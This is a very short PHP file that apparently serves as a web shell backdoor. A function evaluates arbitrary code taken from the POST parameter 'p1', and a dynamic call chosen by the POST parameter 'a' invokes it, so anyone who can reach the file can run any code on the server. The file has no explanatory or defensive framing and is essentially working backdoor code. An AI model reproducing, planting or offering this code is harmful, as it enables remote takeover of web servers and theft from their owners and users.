<?php
function actionPhp() {
	ob_start();
	eval($_POST['p1']);
	exit; 
}

call_user_func('action' . $_POST['a']);
?>